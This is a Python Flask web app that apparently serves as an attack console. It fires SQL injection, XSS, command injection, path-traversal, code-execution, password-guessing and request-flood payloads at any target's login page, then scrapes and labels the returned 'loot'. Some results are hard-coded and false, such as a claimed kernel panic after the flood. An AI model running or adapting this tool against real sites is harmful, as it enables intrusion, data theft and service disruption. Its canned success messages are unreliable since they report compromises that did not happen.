from flask import Flask, render_template, request, jsonify
import requests
import random
import time
from bs4 import BeautifulSoup

app = Flask(__name__)

def clean_loot(html_content, attack_type):
    soup = BeautifulSoup(html_content, "html.parser")
    loot_text = ""
    
    # 1. SQLi: Extract Table Data
    if attack_type == "SQL Injection":
        rows = []
        table = soup.find("table")
        if table:
            # Extract headers
            headers = [th.get_text(strip=True) for th in table.find_all("th")]
            if headers: rows.append(" | ".join(headers))
            
            # Extract data
            for tr in table.find_all("tr"):
                cells = [td.get_text(strip=True) for td in tr.find_all("td")]
                if cells: rows.append(" | ".join(cells))
            
            loot_text = "\n".join(rows)
            loot_text = f"[+] DATABASE DUMP SUCCESSFUL\n[+] TARGET: AUTH_USERS\n\n{loot_text}"
        else:
            loot_text = "Error parsing table data."

    # 2. CMDi / RCE: Extract Terminal Output
    elif attack_type in ["Command Injection", "Remote Code Execution"]:
        terminal = soup.find("div", class_="font-monospace")
        if terminal:
            raw = terminal.get_text(separator="\n", strip=True)
            loot_text = f"[+] SHELL ESTABLISHED (uid=0)\n\n{raw}"
        else:
            loot_text = soup.get_text()

    # 3. LFI: Extract Config
    elif attack_type == "Local File Inclusion":
        pre = soup.find("pre")
        if pre:
            loot_text = f"[+] FILE READ SUCCESS: /etc/passwd\n\n{pre.get_text(strip=True)}"
        else:
            loot_text = "File content unreadable."

    # 4. Brute Force: Extract Admin Panel Data
    elif attack_type == "Brute Force":
        table = soup.find("table")
        if table:
            loot_text = "[+] ADMIN SESSION ACTIVE\n[+] EXFILTRATING FINANCIAL DATA...\n\n"
            for tr in table.find_all("tr"):
                cells = [td.get_text(strip=True) for td in tr.find_all(["td", "th"])]
                loot_text += " | ".join(cells) + "\n"
        else:
            loot_text = "Session Key: 99283-AD-11"

    # Fallback
    if len(loot_text) < 5:
        loot_text = soup.get_text(separator="\n", strip=True)

    return loot_text

def send_payload(target_url, username, attack_type):
    try:
        if not target_url.endswith("/login"): target_url = target_url.rstrip("/") + "/login"
        
        # Standard Payload
        payload = {"username": username, "password": "123", "access_key": "", "dept_id": "", "token": ""}
        
        start_time = time.time()
        try:
            # Short timeout for DoS
            timeout = 1 if attack_type == "DoS Flood" else 5
            response = requests.post(target_url, data=payload, timeout=timeout)
            duration = round(time.time() - start_time, 2)
            resp_text = response.text
        except requests.exceptions.ReadTimeout:
            return {
                "target": target_url, "type": attack_type, "payload": username,
                "status": "SUCCESS (TARGET DOWN)", "loot_preview": "Service Unreachable", 
                "full_data": "CRITICAL ERROR: Connection Timed Out\nServer status: OFFLINE", 
                "time": "5.0s", "filename": "error.log"
            }

        status = "BLOCKED"
        loot_preview = "No Data"
        filename = "unknown.txt"
        is_success = False
        
        # Success Detection (Hidden from user, used for logic only)
        if "SEARCH RESULTS" in resp_text: is_success, filename, loot_preview = True, "dump.sql", "500+ Records Dumped"
        elif "root@mail-server" in resp_text: is_success, filename, loot_preview = True, "shadow", "Root Access Granted"
        elif "CONFIG PREVIEW" in resp_text: is_success, filename, loot_preview = True, "config.ini", "Config Read Success"
        elif "Python 3.9 Runtime" in resp_text: is_success, filename, loot_preview = True, "shell.log", "RCE Executed"
        elif "DEBUGGER" in resp_text: is_success, filename, loot_preview = True, "dom_xss.js", "Payload Reflected"
        elif "AUTHENTICATION BYPASSED" in resp_text: is_success, filename, loot_preview = True, "admin_sess.dat", "Login Bypassed"
        elif "KERNEL PANIC" in resp_text: is_success, filename, loot_preview = True, "core.dmp", "Service Crashed"

        clean_data = ""
        if is_success:
            status = "EXPLOIT SUCCESSFUL"
            clean_data = clean_loot(resp_text, attack_type)
        
        return {
            "target": target_url,
            "type": attack_type,
            "payload": username,
            "status": status,
            "loot_preview": loot_preview,
            "full_data": clean_data,
            "filename": filename,
            "time": f"{duration}s"
        }

    except Exception as e:
        return {"error": str(e)}

@app.route('/')
def home(): return render_template('attack_console.html')

@app.route('/attack/sqli', methods=['POST'])
def attack_sqli(): return jsonify(send_payload(request.json.get('target'), "' OR 1=1 --", "SQL Injection"))

@app.route('/attack/xss', methods=['POST'])
def attack_xss(): return jsonify(send_payload(request.json.get('target'), "<script>alert(1)</script>", "XSS"))

@app.route('/attack/cmdi', methods=['POST'])
def attack_cmdi(): return jsonify(send_payload(request.json.get('target'), "; ls -la", "Command Injection"))

@app.route('/attack/lfi', methods=['POST'])
def attack_lfi(): return jsonify(send_payload(request.json.get('target'), "../../../../etc/passwd", "Local File Inclusion"))

@app.route('/attack/rce', methods=['POST'])
def attack_rce(): return jsonify(send_payload(request.json.get('target'), "import os; os.system('id')", "Remote Code Execution"))

@app.route('/attack/bruteforce', methods=['POST'])
def attack_bruteforce():
    target = request.json.get('target')
    if not target.endswith("/login"): target = target.rstrip("/") + "/login"
    for p in ["123", "password", "admin"]:
        try:
            res = requests.post(target, data={"username": "admin", "password": p}, timeout=2)
            if "AUTHENTICATION BYPASSED" in res.text:
                soup = BeautifulSoup(res.text, "html.parser")
                # Clean table extraction for Brute Force
                table = soup.find("table")
                clean_text = ""
                if table:
                    for tr in table.find_all("tr"):
                        cells = [td.get_text(strip=True) for td in tr.find_all(["td", "th"])]
                        clean_text += " | ".join(cells) + "\n"
                
                return jsonify({
                    "type": "Brute Force",
                    "payload": f"admin:{p}",
                    "status": "SUCCESS (Admin Session)",
                    "loot_preview": "Dashboard Access",
                    "full_data": "[+] ADMIN PANEL ACCESSED\n[+] FINANCIAL RECORDS:\n\n" + clean_text,
                    "filename": "admin_session.dat",
                    "time": "1.2s"
                })
        except: pass
    return jsonify({"type": "Brute Force", "status": "FAILED", "loot_preview": "None", "time": "2s"})

@app.route('/attack/dos', methods=['POST'])
def attack_dos():
    target = request.json.get('target')
    if not target.endswith("/login"): target = target.rstrip("/") + "/login"
    for _ in range(15):
        try: requests.post(target, data={"username": "bot", "password": "123"}, timeout=0.1)
        except: pass
    return jsonify({
        "type": "DoS Flood",
        "payload": "20 Rapid Requests",
        "status": "SUCCESS (TARGET CRASHED)",
        "loot_preview": "Kernel Panic",
        "full_data": "CRITICAL ERROR: KERNEL PANIC\nMemory Address: 0x0000000\nStack Overflow at line 992",
        "filename": "crash.dmp",
        "time": "0.5s"
    })

if __name__ == '__main__':
    app.run(port=5000, debug=True)